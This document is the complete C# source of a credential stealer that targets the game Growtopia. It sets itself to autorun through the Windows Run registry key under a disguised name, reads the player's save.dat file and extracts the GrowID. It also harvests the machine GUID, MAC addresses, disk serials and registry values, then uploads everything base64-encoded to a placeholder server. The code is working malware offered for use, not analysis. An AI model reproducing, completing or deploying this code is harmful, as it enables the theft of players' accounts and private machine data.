using Microsoft.Win32;
using System;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;

namespace Growtopia_Save.dat_Stealer
{
    class Program
    {
        static void Main(string[] args)
        {
            setAutorun(); // Set app to autorun

            try
            {
                using (var check = new WebClient())

                using (check.OpenRead("yourserver.com")) // Check if can connect to server.
                {
                    using (WebClient client = new WebClient())
                    {
                        client.Headers.Add("Content-Type", "application/x-www-form-urlencoded\r\n");

                        NameValueCollection data = new NameValueCollection()
                        {
                            { "code", "pakyubobo"},  // Verification upload code. not your password.
                            { "user", Environment.UserName}, // Get user.
                            { "gid", getGID() }, // GrowID. return null_gid if it is blank/empty.
                            { "data", getContent() } // Get pc info.
                        };

                        client.UploadValues("yourserver.com/process.php", data); // Upload to server.
                    }
                }
            }
            catch
            {
                Environment.Exit(0);
            }
        }

        public static void setAutorun()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (!isAutorun())
                rkApp.SetValue("Space Pirate", Assembly.GetExecutingAssembly().Location);
        }

        public static bool isAutorun()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (rkApp.GetValue("Space Pirate") == null)
                return false;
            else
                return true;
        }

        public static string getGID()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Growtopia/save.dat";

            if (File.Exists(path))
            {
                string data = "";

                try
                {
                    using (FileStream stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        byte[] buf = new byte[1024];
                        int c;

                        while ((c = stream.Read(buf, 0, buf.Length)) > 0)
                        {
                            data += Encoding.ASCII.GetString(buf, 0, c);
                        }
                    }

                    byte[] bytes = Encoding.ASCII.GetBytes(data);

                    string gid = data.Substring(data.IndexOf("tankid_name") + 15, Convert.ToInt32(bytes[data.IndexOf("tankid_name") + 11]));

                    if (string.IsNullOrEmpty(gid))
                    {
                        return "null_gid";
                    }
                    else
                    {
                        return gid;
                    }
                }
                catch
                {
                    return "null_gid";
                }
            }
            else
            {
                return "null_gid";
            }
        }

        static public string getContent()
        {
            string data = Convert.ToBase64String(File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Growtopia/save.dat"));
            string info = "<=break=>";

            info += "<font color = \"lime\"><strong>CURRENT USER:</strong></font>\n\n";
            info += getCurrentUser();

            info += "\n<font color = \"lime\"><strong>OPERATIONAL NETWORK ADAPTERS:</strong></font>\n\n";
            info += getNetworkAdapters();

            info += "\n<font color = \"lime\"><strong>DISKS VOLUME SERIAL:</strong></font>\n\n";
            info += GetDisksVolumeSerial();

            info += "\n<font color = \"lime\"><strong>MACHINE GUID:</strong></font>\n\n";
            info += getMGUID();

            info += "\n<font color = \"lime\">RANDOM 9:</font>\n\n";
            info += get9RND();

            info += "\n<font color = \"lime\">RANDOM 5:</font>\n\n";
            info += get5RND();

            return Convert.ToBase64String(Encoding.ASCII.GetBytes(data + info));
        }


        public static string getCurrentUser()
        {
            string info = "";

            info += "<font color = \"yellow\">Username: </font>" + Environment.UserName + "\n";
            info += "<font color = \"yellow\">Machine Name: </font>" + Environment.MachineName;

            info += "\n\n";

            return info;
        }

        public static string getNetworkAdapters()
        {
            string info = "";

            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Tunnel && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                {
                    info += "<font color = \"yellow\">Name: </font>" + ni.Name + "\n";
                    info += "<font color = \"yellow\">Description: </font>" + ni.Description + "\n";
                    info += "<font color = \"yellow\">Config Id: </font>" + ni.Id + "\n";
                    info += "<font color = \"yellow\">MAC Address: </font>" + string.Join(":", (from z in ni.GetPhysicalAddress().GetAddressBytes() select z.ToString("X2")).ToArray()) + "\n\n";
                }
            }

            return info;
        }

        public static string GetDisksVolumeSerial() // GET DISKS VOLUME SERIAL
        {
            string text = "";

            ManagementClass mangnmt = new ManagementClass("Win32_LogicalDisk");
            ManagementObjectCollection mcol = mangnmt.GetInstances();

            foreach (ManagementObject strt in mcol)
            {
                if (Convert.ToString(strt["VolumeSerialNumber"]).Length == 8)
                {
                    text += "<font color = \"yellow\">Disk " + strt["DeviceID"] + " </font>" + Convert.ToString(strt["VolumeSerialNumber"] + "<br>");
                }
            }

            return text;
        }

        public static string getMGUID()
        {
            string info = "";

            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography");
            info += "<font color = \"yellow\">Machine Guid: </font>" + (string)registryKey.GetValue("MachineGuid", "Null");

            info += "\n\n";

            return info;
        }

        public static string get9RND()
        {
            string info = "";

            var regex = new Regex("^[0-9]+$");

            foreach (var rnd9 in Registry.CurrentUser.GetSubKeyNames())
            {
                if (regex.IsMatch(rnd9))
                {
                    info += "<font color = \"yellow\">[" + rnd9 + "]</font>\n";

                    foreach (var values in Registry.CurrentUser.OpenSubKey(rnd9).GetValueNames())
                    {
                        info += values + "=" + BitConverter.ToString((byte[])Registry.CurrentUser.OpenSubKey(rnd9).GetValue(values)).Replace("-", ",").ToLower() + "\n";
                    }
                }
            }

            info += "\n";

            return info;
        }

        public static string get5RND()
        {
            string info = "";

            var regex = new Regex("^[0-9]+$");

            foreach (var rnd5 in Registry.CurrentUser.OpenSubKey(@"Software\Microsoft").GetSubKeyNames())
            {
                if (regex.IsMatch(rnd5))
                {
                    info += "<font color = \"yellow\">[" + rnd5 + "]</font>\n";

                    foreach (var values in Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\" + rnd5).GetValueNames())
                    {
                        info += values + "=" + BitConverter.ToString((byte[])Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\" + rnd5).GetValue(values)).Replace("-", ",").ToLower() + "\n";
                    }
                }
            }

            info += "\n";

            return info;
        }
    }
}
